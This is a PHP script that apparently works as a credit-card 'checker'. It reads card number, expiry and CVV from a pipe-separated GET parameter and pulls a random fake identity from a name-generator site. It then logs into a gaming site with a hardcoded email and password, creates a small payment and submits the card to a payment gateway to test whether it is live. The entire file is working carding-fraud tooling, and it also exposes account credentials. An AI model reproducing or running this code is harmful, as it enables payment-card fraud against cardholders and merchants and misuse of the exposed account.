<?php 
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $y = substr($yy, 2, 4);
    $cvv = $separator[3];

    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);

    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $postcode = GetStr($local, $state." ", '"');
    $phone = str_replace("-", "", $data['phone']);
 
    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://vvcsgo.com/api/main/user/login/email',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/cookie.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HTTPHEADER => array(
            'accept: application/json, text/plain, */*',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
            'content-type: application/json;charset=UTF-8',
            'origin: https://vvcsgo.com',
            'referer: https://vvcsgo.com/'
        ),
        CURLOPT_POSTFIELDS => '{"email":"atchuptibungco@yahoo.com","password":"hanasakura1"}'
    ));
    $login = curl_exec($ch);
    $token = GetStr($login, '"token":"', '"');

    echo "Token: $token<br><br>";

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://vvcsgo.com/api/main/pay/188',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/cookie.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HTTPHEADER => array(
            'accept: application/json, text/plain, */*',
            'content-type: application/json;charset=UTF-8',
            'origin: https://vvcsgo.com',
            'referer: https://vvcsgo.com/',
            'token: '.$token,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => '{"amount":9,"firstName":"'.$fName.'","lastName":"'.$lName.'","phoneNumber":"'.$phone.'","email":"'.$email.'","postCode":"'.$postcode.'","address":"'.$address.'","country":"CL","state":"'.$state.'","townOrCity":"'.$city.'"}'
    ));
    $getCheckoutUrl = curl_exec($ch);
    $jwt = GetStr($getCheckoutUrl, 'https://pg.pacypay.com/payment/', '"');

    echo "$getCheckoutUrl<br><br>$jwt<br><br>";

    $bust = chunk_split($cc, 4, ' ');

    $encodedCC = base64_encode($bust);
    $encodedMM = base64_encode($mm);
    $encodedYY = base64_encode($y);
    $encodedCVV = base64_encode($cvv);

    echo "$encodedCC | $encodedMM | $encodedYY | $encodedYY<br><br>";

    echo urlencode($encodedYY)."&month=".urlencode($encodedMM)."&cvv=".urlencode($encodedCVV)."&cardNumber=".urlencode($encodedCC);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://pg.pacypay.com/checkoutsale?t=".$jwt,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/cookie.txt",
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'],
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://pg.pacypay.com',
            'referer: https://pg.pacypay.com/payment/'.$jwt,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "transactionType=Checkout&year=".urlencode($encodedYY)."&month=".urlencode($encodedMM)."&cvv=".urlencode($encodedCVV)."&cardNumber=".urlencode($encodedCC)."&cardHolder=$fName&cardHolder=$lName&java_enabled=false&language=en-US&color_depth=24&screen_height=1080&screen_width=1920&time_zone_offset=-480"
    ));
    $getLoc = curl_exec($ch);
    curl_close($ch);
    $location = GetStr($getLoc, 'location:', '\r\n');
    $accessCode = GetStr($location, 'accessCode=', '&');
    $merchantId = GetStr($location, 'mchtId=', '&');
    $accessOrderId = GetStr($location, 'accessOrderId=', '&');

    echo "Location: $location<br><br>accessCode: $accessCode<br><br>MchtId: $merchantId<br><br>accessOrderId: $accessOrderId<br><br>";

    echo "Fname: $fName<br>Lname: $lName<br>Street: $address<br>City: $city<br>State: $state<br>Postcode: $postcode<br>Phone: $phone<br>Email: $email<br>";
    unlink("/cookies/cookie.txt");
?>
